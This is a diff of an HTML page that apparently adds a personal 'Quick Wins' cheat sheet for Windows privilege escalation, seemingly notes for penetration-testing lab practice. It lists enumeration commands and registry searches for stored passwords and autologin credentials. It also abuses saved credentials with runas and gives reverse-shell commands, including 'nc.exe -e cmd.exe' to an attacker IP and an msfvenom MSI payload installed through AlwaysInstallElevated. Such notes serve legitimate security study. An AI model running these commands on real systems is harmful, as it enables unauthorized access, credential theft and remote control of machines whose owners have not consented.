@@ -6,18 +6,18 @@
     <meta name="turbo-cache-control" content="no-cache">
 
     <!-- Primary Meta Tags -->
-    <title>Tags</title>
-    <meta name="title" content="Tags">
+    <title>Quick Wins</title>
+    <meta name="title" content="Quick Wins">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/tags/">
-    <meta property="og:title" content="Tags">
+    <meta property="og:url" content="https://caueb.github.io/windowsprivesc/quick-wins-4e37a/">
+    <meta property="og:title" content="Quick Wins">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/tags/">
-    <meta property="twitter:title" content="Tags">
+    <meta property="twitter:url" content="https://caueb.github.io/windowsprivesc/quick-wins-4e37a/">
+    <meta property="twitter:title" content="Quick Wins">
     
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -26,6 +26,7 @@
     <script type="text/javascript" src="/resources/js/config.js?v=1.11.2.699670771344" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=1.11.2" defer data-turbo-track="reload"></script>
     <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=1.11.2.699670771344" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=1.11.2.699670771344" defer></script>
 </head>
     <body>
         <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -180,19 +181,146 @@
                 <div id="docs-sidebar-right-toggle"></div>
                
                 <!-- Page content  -->
-<doc-anchor-target id="tags" class="break-words">
+<doc-anchor-target id="quick-wins" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#tags">#</doc-anchor-trigger>
-        <span>Tags</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#quick-wins">#</doc-anchor-trigger>
+        <span>Quick Wins</span>
     </h1>
 </doc-anchor-target>
-<ul style="padding-left: 0px;">
-<li class="relative block py-1">
-<a href="/tags/enum/" class="no-link inline-flex items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
-    <span>enum</span>
-</a>
-</li>
-</ul>
+<doc-anchor-target id="run-powershell">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#run-powershell">#</doc-anchor-trigger>
+        <span>Run Powershell</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">powershell -ep bypass</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="powershell-history">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#powershell-history">#</doc-anchor-trigger>
+        <span>PowerShell History</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># GET THE PATH TO THE LOG FILE
+(Get-PSReadlineOption).HistorySavePath
+
+# DEFAULT PATH
+$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# USER PATH
+C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="user-enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user-enumeration">#</doc-anchor-trigger>
+        <span>User Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">whoami
+whoami /priv
+whoami /groups
+whoami /all
+net user
+net user bob
+net user administrator</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="os-enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#os-enumeration">#</doc-anchor-trigger>
+        <span>OS Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
+hostname</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="hot-fixes">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#hot-fixes">#</doc-anchor-trigger>
+        <span>Hot Fixes</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="open-ports">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#open-ports">#</doc-anchor-trigger>
+        <span>Open Ports</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">netstat -ano   # Compare internal/external ports open
+netstat -ano | findstr &quot;127.0.0.1&quot;  # Get only local ports open
+
+# FOUND INTERESTING LOCAL PORT? FORWARD IT! (nickel machine)
+ssh -N -L 0.0.0.0:1337:127.0.0.1:14147 ariah@192.168.245.99</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="check-firewall">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#check-firewall">#</doc-anchor-trigger>
+        <span>Check Firewall</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">netsh firewall show state        # Is it enabled?
+netsh firewall show config       # Check the ports/rules</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="find-passwords">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#find-passwords">#</doc-anchor-trigger>
+        <span>Find Passwords</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="in-the-registry">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#in-the-registry">#</doc-anchor-trigger>
+        <span>In the registry</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query HKLM /f password /t REG_SZ /s    # Maybe try 'pass' instead of 'password'
+reg query HKCU /f password /t REG_SZ /s    # Maybe try 'pass' instead of 'password'</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="autologin">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#autologin">#</doc-anchor-trigger>
+        <span>Autologin</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="runas">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#runas">#</doc-anchor-trigger>
+        <span>RunAS</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">cmdkey /list    # If return &quot;User: HOSTNAME/Administrator&quot; we can run cmds as Administrator using stored creds
+
+# Example
+c:/Windows/System32/runas.exe /user:HOSTNAME\Administrator /savecred &quot;C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\proof.txt &gt; C:\Users\lowprivuser\proof.txt&quot;
+
+# Reverse Shell
+c:\Windows\System32\runas.exe /user: ACCESS\Administrator /savecred &quot;nc.exe -e cmd.exe 192.168.x.x 4444&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="alwayselevated">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#alwayselevated">#</doc-anchor-trigger>
+        <span>AlwaysElevated</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated      # Should return 0x1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated      # Should return 0x1
+msvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 -f msi -o setup.msi   # Create a rev shell (kali)
+msiexec /i &quot;C:\Windows\Temp\shell.msi&quot;  # Install/run the rev shell (win)</code></pre>
+</doc-codeblock></div>
 
 
 
@@ -202,6 +330,27 @@
             </div>
 
             
+<nav class="flex mt-14">
+    <div class="w-1/2">
+        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/windowsprivesc/potatoes-ea4db/">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+            <span>
+                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                <span class="block mt-1">Potatoes</span>
+            </span>
+        </a>
+    </div>
+
+    <div class="w-1/2">
+        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/windowsprivesc/service-ex-15391/">
+            <span>
+                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                <span class="block mt-1">Service Exploit</span>
+            </span>
+            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+        </a>
+    </div>
+</nav>
 
 
         </main>
@@ -244,6 +393,6 @@
 
         <div id="docs-overlay-target"></div>
 
-        <script>window.__DOCS__ = { "title": "Tags", icon: "file", hasPrism: false, hasMermaid: false, hasMath: false }</script>
+        <script>window.__DOCS__ = { "title": "Quick Wins", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
     </body>
 </html>
